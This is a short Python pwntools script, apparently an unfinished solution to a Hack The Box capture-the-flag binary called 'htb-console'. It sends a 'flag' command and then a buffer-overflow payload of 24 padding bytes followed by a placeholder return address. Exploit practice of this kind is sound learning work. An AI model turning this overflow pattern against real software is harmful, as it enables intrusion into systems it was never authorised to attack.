from pwn import *
import pwn

# Read notes.txt honestly, there's too much in brain analysis and I've already got a segfault

p = process("./htb-console")

ip1 = p.recv()
print(ip1) # prints the welcome line

command = b"flag"
p.sendline(command)

ip2 = p.recv()
print(ip2) #Prints enter flag line where we send the payload

padding = b"A"*24
ret_addr = b"\x42\x42\x42\x42\x42\x42"
payload = padding + ret_addr

print(payload)
p.sendline(payload)



